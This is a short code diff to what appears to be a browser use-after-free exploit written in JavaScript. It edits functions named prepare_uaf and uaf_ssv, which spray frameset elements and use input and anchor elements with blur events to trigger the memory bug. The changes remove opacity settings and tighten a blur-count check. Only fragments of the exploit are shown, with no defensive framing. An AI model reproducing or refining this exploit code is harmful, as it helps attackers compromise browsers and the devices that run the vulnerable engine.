@@ -157,7 +157,6 @@ function prepare_uaf() {
     function alloc_fs(fsets, size) {
         for (let i = 0; i < size / 2; i++) {
             const fset = document.createElement('frameset');
-            fset.style.opacity = '0'; // Set the opacity to 0
             fset.rows = rows;
             fset.cols = rows;
             fsets.push(fset);
@@ -196,13 +195,10 @@ function prepare_uaf() {
 async function uaf_ssv(fsets, index, index2) {
     const views = [];
     const input = document.createElement('input');
-    input.style.opacity = '0'; // Set the opacity to 0
     input.id = 'input';
     const foo = document.createElement('input');
-    foo.style.opacity = '0'; // Set the opacity to 0
     foo.id = 'foo';
     const bar = document.createElement('a');
-    bar.style.opacity = '0'; // Set the opacity to 0
     bar.id = 'bar';
 
     log(`ssv_len: ${hex(ssv_len)}`);
@@ -250,7 +246,7 @@ async function uaf_ssv(fsets, index, index2) {
         const idx = is_input ? 0 : 1;
         log(`${target.id} blur came`);
 
-        if (blurs[idx] > 1)  {
+        if (blurs[idx] > 0)  {
             die(`${name}: multiple blurs. blurs: ${blurs[idx]}`);
         }
 
